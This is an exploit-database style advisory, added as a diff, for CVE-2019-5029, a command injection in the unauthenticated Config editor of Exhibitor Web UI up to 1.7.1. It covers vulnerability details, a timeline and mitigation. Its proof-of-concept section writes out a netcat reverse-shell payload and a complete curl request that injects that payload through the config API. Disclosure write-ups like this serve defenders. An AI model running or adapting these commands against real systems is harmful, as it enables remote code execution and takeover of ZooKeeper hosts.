@@ -1,0 +1,86 @@
+# Exploit Title: Exhibitor Web UI 1.7.1 - Remote Code Execution
+# Date: 2019-11-13
+# Exploit Author: Logan Sanderson
+# Web Site: https://github.com/soabase/exhibitor/wiki/Running-Exhibitor
+# Version : 1.7.1
+# CVE : CVE-2019-5029
+
+Exhibitor UI command injection vulnerability
+November 13, 2019
+CVE Number
+
+CVE-2019-5029
+Summary
+
+An exploitable command injection vulnerability exists in the Config editor of the Exhibitor Web UI versions 1.0.9 to 1.7.1. Arbitrary shell commands surrounded by backticks or $() can be inserted into the editor and will be executed by the Exhibitor process when it launches ZooKeeper. An attacker can execute any command as the user running the Exhibitor process.
+Tested Versions
+
+Tested version was compiled using the standalone pom.xml from the Exhibitor master branch.
+
+(Note that the latest released version is labeled 1.7.1, but the version in the exhibitor-standalone’s pom.xml is set to 1.6.0.)
+
+The vulnerability should affect all versions at least as far back as 1.0.9, when the javaEnvironment variable was added.
+Product URLs
+
+https://github.com/soabase/exhibitor
+CVSSv3 Score
+
+9.8 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+CWE
+
+CWE-78 - Improper Neutralization of Special Elements used in an OS Command
+Details
+
+Exhibitor is a ZooKeeper supervisory process, which is described in the ZooKeeper documentation.
+
+Since the ZooKeeper server will exit on an error, the Apache ZooKeeper documentation suggests a supervisory process that manages the ZooKeeper server process, mainly for the purpose of restarting ZooKeeper when it exits.
+
+Exhibitor’s Web UI does not have any form of authentication, and prior to version 1.7.0, did not have any way to specify which interfaces to listen on. Exposing Exhibitor is dangerous for the ZooKeeper ensemble because Exhibitor allows the changing of the ZooKeeper configuration, and also provides a UI for viewing and modifying keys and values stored in ZooKeeper.
+
+By default, the Exhibitor Web UI listens on TCP 8080. However, since this port is commonly used, it may be common to find it on other ports as well.
+
+Under the Config tab in the Exhibitor Web UI, the “java.env script” field can be modified and the new configuration pushed to ZooKeeper. Exhibitor launches ZooKeeper through a script, and the contents of this field are passed, unmodified, as arguments to the Java command to launch ZooKeeper, which can be seen here.
+
+(The contents of the “java.env script” field are passed in as $JVMFLAGS.)
+
+Based on how this argument is passed, there are several ways to execute arbitrary commands. The methods tested were surrounding the command with backticks and using $(), for example:
+
+$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
+
+This example uses netcat to open a reverse shell to a listener on 10.0.0.64:4444.
+
+In the example, ZooKeeper will still launch successfully after the command executes, and it will run the command every time ZooKeeper is re-launched by Exhibitor.
+Exploit Proof of Concept
+
+The included screenshots show the process of obtaining a root shell on the system.
+
+The steps to exploit it from a web browser:
+
+    Open the Exhibitor Web UI and click on the Config tab, then flip the Editing switch to ON
+
+    In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:
+
+    $(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
+    Click Commit > All At Once > OK
+    The command may take up to a minute to execute.
+
+It can also be performed with a single curl command:
+
+command: curl -X POST -d @data.json http://10.0.0.200:8080/exhibitor/v1/config/set
+
+data.json: { “zookeeperInstallDirectory”: “/opt/zookeeper”, “zookeeperDataDirectory”: “/opt/zookeeper/snapshots”, “zookeeperLogDirectory”: “/opt/zookeeper/transactions”, “logIndexDirectory”: “/opt/zookeeper/transactions”, “autoManageInstancesSettlingPeriodMs”: “0”, “autoManageInstancesFixedEnsembleSize”: “0”, “autoManageInstancesApplyAllAtOnce”: “1”, “observerThreshold”: “0”, “serversSpec”: “1:exhibitor-demo”, “javaEnvironment”: “$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)”, “log4jProperties”: “”, “clientPort”: “2181”, “connectPort”: “2888”, “electionPort”: “3888”, “checkMs”: “30000”, “cleanupPeriodMs”: “300000”, “cleanupMaxFiles”: “20”, “backupPeriodMs”: “600000”, “backupMaxStoreMs”: “21600000”, “autoManageInstances”: “1”, “zooCfgExtra”: { “tickTime”: “2000”, “initLimit”: “10”, “syncLimit”: “5”, “quorumListenOnAllIPs”: “true” }, “backupExtra”: { “directory”: “” }, “serverId”: 1 }
+Mitigation
+
+Since Exhibitor has no built-in authentication, it would be helpful to limit the interfaces it listens on to only trusted networks, or require authentication using something like an nginx reverse proxy and block all other access using firewall rules.
+
+If the features provided by the Exhibitor Web UI are not needed and the only needed functionality is managing the ZooKeeper process, it should be replaced with a simpler ZooKeeper supervisor solution, such as a systemd service.
+Timeline
+
+2019-03-08 - Vendor Disclosure
+2019-05-01 - GitHub issue #389 created; Vendor advised point of contact changed. Copy of report sent to new point of contact
+2019-05-14 - (75 day) 3rd follow up with vendor
+2019-05-29 - Final notice of public disclosure release
+2019-11-13 - Public Release
+Credit
+
+Discovered by Logan Sanderson of Cisco ASIG.
